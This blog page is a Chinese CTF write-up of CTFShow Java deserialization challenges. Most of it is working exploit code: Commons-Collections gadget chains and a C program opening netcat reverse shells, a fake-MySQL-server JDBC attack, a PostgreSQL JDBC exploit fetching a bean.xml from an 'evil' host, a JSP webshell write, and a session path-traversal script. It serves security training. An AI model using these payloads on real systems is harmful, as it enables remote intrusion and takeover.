@@ -1,0 +1,714 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CTFShow Java反序列化 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="CTFShow Java反序列化 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="web846
+URL DNS链，直接构造就行
+package CC1;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.net.URL;
+import java...." />
+    <meta name="keywords" content="JAVA,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              CTFShow Java反序列化
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-24
+              </span>
+              <span>
+                15 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/RwDqGW2an/" class="post-tag">
+                  # JAVA
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/ctfshow-java-fan-xu-lie-hua.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="web846">web846</h1>
+<p>URL DNS链，直接构造就行</p>
+<pre><code class="language-java">package CC1;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.net.URL;
+import java.util.Base64;
+import java.util.HashMap;
+
+public class URLDNS {
+    public static void main(String[] args) throws Exception{
+        HashMap&lt;URL, Integer&gt; h = new HashMap&lt;&gt;();
+        URL url = new URL(&quot;http://c663d4f2-5854-4e9a-bf4c-27e0ccff6cf5.challenge.ctf.show/&quot;);
+
+        Class c = url.getClass();
+        Field hashCodeField = c.getDeclaredField(&quot;hashCode&quot;);
+        hashCodeField.setAccessible(true);
+
+        hashCodeField.set(url, 555);	// 在put前修改hashCode的值，避免序列化的时候本地发起DNS请求
+        h.put(url, 1);
+        hashCodeField.set(url, -1);		// put之后改为-1
+
+        String S = serializeToBase64(h);
+        System.out.println(S);
+    }
+    public static String serializeToBase64(Object obj) throws IOException {
+        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
+             ObjectOutputStream oos = new ObjectOutputStream(baos)) {
+
+            oos.writeObject(obj);
+            oos.flush();
+
+            return Base64.getEncoder().encodeToString(baos.toByteArray());
+        }
+    }
+
+    public static Object deserializeFromBase64(String base64String) throws IOException, ClassNotFoundException {
+        byte[] data = Base64.getDecoder().decode(base64String);
+
+        try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
+             ObjectInputStream ois = new ObjectInputStream(bais)) {
+
+            return ois.readObject();
+        }
+    }
+
+}
+
+</code></pre>
+<p>顺带一提，这里要对post的内容需要进行一次url编码。</p>
+<h1 id="web847-web853">web847-web853</h1>
+<p>这部分的题的CC链就可以打，但是ban掉的类又没有写，完全不知道有什么意义。</p>
+<h1 id="web854">web854</h1>
+<p>我是java8，使用了<strong>commons-collections 4.0</strong>的库并对一些可能有危险的类进行了封禁，包含:</p>
+<ul>
+<li>TransformedMap</li>
+<li>PriorityQueue</li>
+<li>InstantiateTransformer</li>
+<li>TransformingComparator</li>
+<li>TemplatesImpl</li>
+<li>AnnotationInvocationHandler</li>
+<li>HashSet</li>
+<li>Hashtable</li>
+<li>LazyMap</li>
+</ul>
+<p>根据限制，使用<code>BadAttributeValueExpException</code>做入口，用<code>DefaultedMap</code>替换<code>LazyMap</code>，走<code>Runtime.exec</code>。也就是CC5那条链</p>
+<pre><code class="language-java">package ctfshow.ser;
+
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.map.DefaultedMap;
+
+import javax.management.BadAttributeValueExpException;
+import java.lang.reflect.Field;
+import java.util.Map;
+
+import static ctfshow.ser.Tools.deserializeFromBase64;
+import static ctfshow.ser.Tools.serializeToBase64;
+
+public class Web854 {
+    public static void main(String[] args) throws Exception{
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;nc IP PORT -e /bin/sh&quot;})
+//                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -a Calculator&quot;})
+        };
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer&lt;&gt;(transformers);
+
+        Map defaultedMap = new DefaultedMap(chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap, null);
+
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+        Field valfield = val.getClass().getDeclaredField(&quot;val&quot;);
+        valfield.setAccessible(true);
+        valfield.set(val, tiedMapEntry);
+
+        String s = serializeToBase64(val);
+        System.out.println(s);
+//        deserializeFromBase64(s);
+    }
+}
+
+</code></pre>
+<h1 id="web855">web855</h1>
+<p>没有使用额外的库，但有个user类</p>
+<pre><code class="language-java">package com.ctfshow.entity;
+ 
+import java.io.*;
+ 
+public class User implements Serializable {
+    private static final long serialVersionUID = 0x36d;
+    private String username;
+    private String password;
+ 
+    public User(String username, String password) {
+        this.username = username;
+        this.password = password;
+    }
+ 
+    public String getUsername() {
+        return username;
+    }
+ 
+    public void setUsername(String username) {
+        this.username = username;
+    }
+ 
+    public String getPassword() {
+        return password;
+    }
+ 
+    public void setPassword(String password) {
+        this.password = password;
+    }
+ 
+ 
+    private static final String OBJECTNAME=&quot;ctfshow&quot;;
+    private static final String SECRET=&quot;123456&quot;;
+ 
+    private static  String shellCode=&quot;chmod +x ./&quot;+OBJECTNAME+&quot; &amp;&amp; ./&quot;+OBJECTNAME;
+ 
+ 
+ 
+    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
+        int magic = in.readInt();
+        if(magic==2135247942){
+            byte var1 = in.readByte();
+ 
+            switch (var1){
+                case 1:{
+                    int var2 = in.readInt();
+                    if(var2==0x36d){
+ 
+                        FileOutputStream fileOutputStream = new FileOutputStream(OBJECTNAME);
+                        fileOutputStream.write(new byte[]{0x7f,0x45,0x4c,0x46});
+                        byte[] temp = new byte[1];
+                        while((in.read(temp))!=-1){
+                            fileOutputStream.write(temp);
+                        }
+ 
+                        fileOutputStream.close();
+                        in.close();
+ 
+                    }
+                    break;
+                }
+                case 2:{
+ 
+                    ObjectInputStream.GetField gf = in.readFields();
+                    String username = (String) gf.get(&quot;username&quot;, null);
+                    String password = (String) gf.get(&quot;password&quot;,null);
+                    username = username.replaceAll(&quot;[\\p{C}\\p{So}\uFE00-\uFE0F\\x{E0100}-\\x{E01EF}]+&quot;, &quot;&quot;)
+                            .replaceAll(&quot; {2,}&quot;, &quot; &quot;);
+                    password = password.replaceAll(&quot;[\\p{C}\\p{So}\uFE00-\uFE0F\\x{E0100}-\\x{E01EF}]+&quot;, &quot;&quot;)
+                            .replaceAll(&quot; {2,}&quot;, &quot; &quot;);
+                    User var3 = new User(username,password);
+                    User admin = new User(OBJECTNAME,SECRET);
+                    if(var3 instanceof  User){
+                        if(OBJECTNAME.equals(var3.getUsername())){
+                            throw  new RuntimeException(&quot;object unserialize error&quot;);
+                        }
+                        if(SECRET.equals(var3.getPassword())){
+                            throw  new RuntimeException(&quot;object unserialize error&quot;);
+                        }
+                        if(var3.equals(admin)){
+                            Runtime.getRuntime().exec(shellCode);
+                        }
+                    }else{
+                        throw  new RuntimeException(&quot;object unserialize error&quot;);
+                    }
+                    break;
+                }
+                default:{
+                    throw  new RuntimeException(&quot;object unserialize error&quot;);
+                }
+            }
+        }
+ 
+    }
+ 
+    @Override
+    public boolean equals(Object o) {
+        if (this == o) return true;
+        if (!(o instanceof User)) return false;
+        User user = (User) o;
+        return this.hashCode() == user.hashCode();
+    }
+ 
+    @Override
+    public int hashCode() {
+        return username.hashCode()+password.hashCode();
+    }
+ 
+ 
+}
+</code></pre>
+<p>这里ObjectInputStream的readInt, readByte, read是从流中读数据的，这些数据可以在序列化writeObject的时候写入流中。</p>
+<p>简单测试下：</p>
+<pre><code class="language-java">private void writeObject(ObjectOutputStream out) throws IOException {
+    out.writeInt(2135247942);
+    out.writeByte(1);
+    out.writeInt(0x36d);
+}
+private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
+    int magic = in.readInt();
+    System.out.println(magic);
+    if(magic==2135247942){
+        byte var1 = in.readByte();
+        System.out.println(var1);
+        switch (var1){
+            case 1:{
+                int var2 = in.readInt();
+                System.out.println(var2);
+                break;
+            }
+            case 2:{
+                break;
+            }
+            default:{
+                throw  new RuntimeException(&quot;object unserialize error&quot;);
+            }
+        }
+    }
+}
+</code></pre>
+<p>这个User的readObject可以干两件事，对应着<code>case 1</code>和<code>case 2</code></p>
+<ul>
+<li>把输入流中的数据写到文件中。</li>
+<li>执行这个写好的文件。</li>
+</ul>
+<h2 id="写入文件">写入文件</h2>
+<p>用<code>case 1</code>写一个恶意文件，<code>gcc Evil.c -o Evil</code></p>
+<pre><code class="language-c">#include&lt;stdlib.h&gt;
+int main() {
+    system(&quot;nc ip port -e /bin/sh&quot;); 
+    return 0;	
+}
+
+</code></pre>
+<p>编译好后，将文件前四个字节删掉（后面写文件时会提前写入）。</p>
+<p>编写writeObject创建第一次传入的反序列化字符串。</p>
+<pre><code class="language-java">private void writeObject(ObjectOutputStream out) throws IOException {
+    out.writeInt(2135247942);
+    out.writeByte(1);
+    out.writeInt(0x36d);
+    File filename = new File(&quot;src/main/java/com/ctfshow/entity/web855&quot;); //gcc生成的文件位置
+    BufferedInputStream in = new BufferedInputStream(new FileInputStream(filename));
+    ByteArrayOutputStream out2 = new ByteArrayOutputStream(1024);
+    byte[] temp = new byte[1024];
+    int size = 0;
+    while((size = in.read(temp)) != -1){
+        out2.write(temp, 0, size);
+    }
+    in.close();
+    byte[] content = out2.toByteArray();
+    out.write(content);
+    out.defaultWriteObject();
+}
+</code></pre>
+<h2 id="hash碰撞">Hash碰撞</h2>
+<p><code>case 2</code>中会将传入的User对象的username和password提取出来实例化一个var3，其中username和password不能为<code>ctfshow/123456</code>，但要满足<code>var3.equals(admin)</code>。</p>
+<p>这里equals是User类重写了的，比较的是两个类的<code>hashCode()</code>，而<code>hashCode()</code>也经过了重写</p>
+<pre><code class="language-java">public int hashCode() {
+    return username.hashCode() + password.hashCode();
+}
+</code></pre>
+<p>而字符串的hashCode方法为</p>
+<pre><code class="language-java">public int hashCode() {
+    int h = hash;
+    if (h == 0 &amp;&amp; value.length &gt; 0) {
+        char val[] = value;
+
+        for (int i = 0; i &lt; value.length; i++) {
+            h = 31 * h + val[i];
+        }
+        hash = h;
+    }
+    return h;
+}
+</code></pre>
+<p>对字符串中的每一个字符，都将之前计算的 <strong>h（初始为0）</strong> 值乘以31，然后加上当前字符的ASCII值。最后这个值就是这个字符串的hash值。</p>
+<p>很显然这个是可以碰撞出一样hash值的字符串的。参考<a href="https://blog.csdn.net/miuzzx/article/details/128303093">yu22x师傅的脚本</a></p>
+<pre><code class="language-python">def hashcode(val):
+    h=0
+    for i in range(len(val)):
+        h=31 * h + ord(val[i])
+    return h
+    
+# 最少只要前两个字符的和相同，后面计算出来的和也相同
+t = &quot;ct&quot;	
+# t = &quot;12&quot;
+for k in range(1, 128):
+    for l in range(1, 128):
+        if t != (chr(k) + chr(l)):
+            if(hashcode(t) == hashcode(chr(k)+chr(l))):
+                print(t, chr(k)+chr(l))
+</code></pre>
+<p>找到了用<code>dUtfshow/0Q3456</code>代替<code>ctfshow/123456</code>。</p>
+<p>重写<code>writeObject</code></p>
+<pre><code class="language-java">private void writeObject(ObjectOutputStream out) throws IOException {
+       out.writeInt(2135247942);
+       out.writeByte(2);
+       out.defaultWriteObject();
+}
+</code></pre>
+<p>序列化</p>
+<pre><code class="language-java">package com.ctfshow.entity;
+
+import static com.ctfshow.entity.Tools.deserializeFromBase64;
+import static com.ctfshow.entity.Tools.serializeToBase64;
+
+public class Demo {
+    public static void main(String[] args) throws Exception{
+        User user = new User(&quot;dUfshow&quot;, &quot;0Q3456&quot;);
+        String s = serializeToBase64(user);
+        System.out.println(s);
+        // deserializeFromBase64(s);
+
+    }
+}
+
+</code></pre>
+<h1 id="web856">web856</h1>
+<p>MySQL JDBC 客户端反序列化，参考<a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p>
+<p>这个漏洞发生在MySQL JDBC连接数据库的时候，如果JDBC URL可控，那可以让它连接到我们MySQL服务器上来执行一个自定义的反序列化内容。</p>
+<p>Demo</p>
+<pre><code class="language-java">public class Demo {
+    public static void main(String[] args) throws Exception{
+        String driver = &quot;com.mysql.jdbc.Driver&quot;;
+        String DB_URL = &quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc&quot;;//8.x使用
+        //String DB_URL = &quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc&quot;;//5.x使用
+        Class.forName(driver);
+        Connection conn = DriverManager.getConnection(DB_URL);
+    }
+}
+</code></pre>
+<p>JDBC URL的格式如下：<code>protocol//[hosts]/[database]?properties</code>。前面都好理解，问题在<code>properties</code>上，它可以设定MySQL Connector/J连接mysql服务器的具体方式。其中和漏洞的连接属性有两个，分别是<code>autoDeserialize</code>和<code>queryInterceptors</code>。</p>
+<ul>
+<li><code>autoDeserialize</code>：设定MySQL Connector/J是否反序列化BLOB类型的数据</li>
+<li><code>queryInterceptors</code>：拦截器，在查询执行时触发，在执行查询语句前后分别调用拦截器的preProcess和postProcess方法。</li>
+</ul>
+<p>而在<code>getConnection</code>过程中，会触发<code>SET NAMES utf、set autocommit=1</code>一类的请求，所以会触发我们所配置的<code>queryInterceptors</code>。</p>
+<p>在<code>ServerStatusDiffInterceptor</code>的<code>preProcess</code>方法中会进行<code>SHOW SESSION STAUS</code>语句并获取结果，因为设置<code>autoDeserialize=true</code>，这个结果会被反序列化。</p>
+<p>所以如果能操作这个查询结果，就可以任意执行反序列化操作，这里用到的工具是<a href="https://github.com/fnmsd/MySQL_Fake_Server">MySQL_Fake_Server</a>。</p>
+<p>回到题目，题目环境有commons-collections 4.0，那么我们可以用一条CC链来执行命令。修改MySQL_Fake_Server的config.json的<code>yso</code>，让ysoserial执行查到的对应user的命令。</p>
+<pre><code class="language-json">{
+    &quot;config&quot;:{
+        &quot;ysoserialPath&quot;:&quot;ysoserial-0.0.6-SNAPSHOT-all.jar&quot;,
+        &quot;javaBinPath&quot;:&quot;java&quot;,
+        &quot;fileOutputDir&quot;:&quot;./fileOutput/&quot;,
+        &quot;displayFileContentOnScreen&quot;:true,
+        &quot;saveToFile&quot;:true
+    },
+    &quot;fileread&quot;:{
+        &quot;win_ini&quot;:&quot;c:\\windows\\win.ini&quot;,
+        &quot;win_hosts&quot;:&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;,
+        &quot;win&quot;:&quot;c:\\windows\\&quot;,
+        &quot;linux_passwd&quot;:&quot;/etc/passwd&quot;,
+        &quot;linux_hosts&quot;:&quot;/etc/hosts&quot;,
+        &quot;index_php&quot;:&quot;index.php&quot;,
+        &quot;ssrf&quot;:&quot;https://www.baidu.com/&quot;,
+        &quot;__defaultFiles&quot;:[&quot;/etc/hosts&quot;,&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;]
+    },
+    &quot;yso&quot;:{
+        &quot;sky3&quot;:[&quot;CommonsCollections4&quot;,&quot;nc IP PORT -e /bin/sh&quot;]	
+    }
+}
+</code></pre>
+<p>在服务器上运行server.py。然后构造exp</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception{
+    Connection connection = new Connection();
+    connection.setSchema(&quot;jdbc:mysql&quot;);
+    connection.setHost(&quot;IP&quot;);
+    connection.setPort(3306);
+    connection.setDatabase(&quot;autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;);
+    connection.setUser(new User(&quot;sky3&quot;, &quot;123&quot;));
+
+    String s = serializeToBase64(connection);
+    System.out.println(s);
+//        deserializeFromBase64(s);
+}
+</code></pre>
+<p>传入，get shell</p>
+<h1 id="web857">web857</h1>
+<p>参考：<a href="https://forum.butian.net/share/1339">https://forum.butian.net/share/1339</a></p>
+<p>REC</p>
+<pre><code class="language-java">package sec.PostgreSQL;
+
+import java.sql.Connection;
+import java.sql.DriverManager;
+
+public class cve_2022_21724 {
+    public static void main(String[]args)throws Exception{
+        String socketFactoryClass = &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;;
+        String socketFactoryArg = &quot;http://evil:8888/bean.xml&quot;;
+        String jdbcUrl = &quot;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=&quot;+socketFactoryClass+ &quot;&amp;socketFactoryArg=&quot;+socketFactoryArg;
+        System.out.println(jdbcUrl);
+                Connection connection = DriverManager.getConnection(jdbcUrl);
+    }
+}
+
+</code></pre>
+<p>bean.xml</p>
+<pre><code class="language-xml">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
+  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+  xmlns:p=&quot;http://www.springframework.org/schema/p&quot;
+  xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans
+  http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;
+  &lt;!--    普通方式创建类--&gt;
+  &lt;bean id=&quot;exec&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;
+    &lt;constructor-arg&gt;
+      &lt;list&gt;
+        &lt;value&gt;bash&lt;/value&gt;
+        &lt;value&gt;-c&lt;/value&gt;
+        &lt;value&gt;{echo,base64}|{base64,-d}|{bash,-i}&lt;/value&gt;
+      &lt;/list&gt;
+    &lt;/constructor-arg&gt;
+  &lt;/bean&gt;
+&lt;/beans&gt;
+</code></pre>
+<p>文件写入</p>
+<pre><code class="language-java">package sec.PostgreSQL;
+
+import java.sql.DriverManager;
+
+public class cve_2022_21724_filewrite {
+    public static void main(String[]args)throws Exception{
+        String loggerLevel=&quot;DEBUG&quot;;
+        String loggerFile=&quot;../hack.jsp&quot;;
+        String shellContent=&quot;&lt;%25test;%25&gt;&quot;;
+
+        String dbUrl = &quot;jdbc:postgresql:///?loggerLevel=&quot;+loggerLevel+&quot;&amp;loggerFile=&quot;+loggerFile+&quot;&amp;&quot;+shellContent;
+        System.out.println(dbUrl);
+        DriverManager.getConnection(dbUrl);
+    }
+}
+</code></pre>
+<p>exp，RCE没跑通不知道为什么</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception{
+    Connection connection = new Connection();
+    connection.setSchema(&quot;jdbc:postgresql&quot;);
+    connection.setDriver(&quot;org.postgresql.Driver&quot;);
+    connection.setHost(&quot;127.0.0.1&quot;);
+    connection.setPort(5432);
+    String loggerLevel=&quot;DEBUG&quot;;
+    String loggerFile=&quot;../webapps/ROOT/hack.jsp&quot;;
+    String shellContent=&quot;&lt;%Runtime.getRuntime().exec(request.getParameter(\\\&quot;i\\\&quot;));%&gt;&quot;;
+    String dbUrl = &quot;loggerLevel=&quot;+loggerLevel+&quot;&amp;loggerFile=&quot;+loggerFile+&quot;&amp;&quot;+shellContent;
+    connection.setDatabase(dbUrl);
+    connection.setUser(new User(&quot;sky3&quot;, &quot;123&quot;));
+
+    String s = serializeToBase64(connection);
+    System.out.println(s);
+    //        deserializeFromBase64(s);
+}
+</code></pre>
+<h1 id="web858">web858</h1>
+<p>参考：<a href="https://blog.csdn.net/qq_40898302/article/details/124291764">https://blog.csdn.net/qq_40898302/article/details/124291764</a></p>
+<p>漏洞之后复现一下，记下解题流程</p>
+<p>用下面的代码生成user类的序列化文件</p>
+<pre><code class="language-java">package com.ctfshow.entity;
+
+import java.io.*;
+
+public class Demo {
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException {
+        User user = new User();
+        user.setUsername(&quot;cp /flag /usr/local/tomcat/webapps/ROOT/flag.txt&quot;);
+        serialize(user);
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;a.session&quot;));
+        oos.writeObject(obj);
+    }
+}
+</code></pre>
+<p>上传a.session，用下面的脚本触发</p>
+<pre><code class="language-java">import requests
+
+url = 'http://49b46d3b-952f-4c2d-b796-92952a64f714.challenge.ctf.show/'
+cookies = {
+        &quot;JSESSIONID&quot;:&quot;../../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/upload/a&quot;
+}
+response = requests.get(url=url,cookies=cookies)
+print(response.text)
+</code></pre>
+<p>访问<code>http://49b46d3b-952f-4c2d-b796-92952a64f714.challenge.ctf.show/flag.txt</code></p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://evo1ution.cn/2023/08/26/ctfshow-web4/">https://evo1ution.cn/2023/08/26/ctfshow-web4/</a><br>
+<a href="https://blog.csdn.net/miuzzx/article/details/128221385">https://blog.csdn.net/miuzzx/article/details/128221385</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#web846">web846</a></li>
+<li><a href="#web847-web853">web847-web853</a></li>
+<li><a href="#web854">web854</a></li>
+<li><a href="#web855">web855</a>
+<ul>
+<li><a href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6">写入文件</a></li>
+<li><a href="#hash%E7%A2%B0%E6%92%9E">Hash碰撞</a></li>
+</ul>
+</li>
+<li><a href="#web856">web856</a></li>
+<li><a href="#web857">web857</a></li>
+<li><a href="#web858">web858</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/jackson-yuan-sheng-fan-xu-lie-hua/">
+              <h3 class="post-title">
+                Jackson 原生反序列化
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
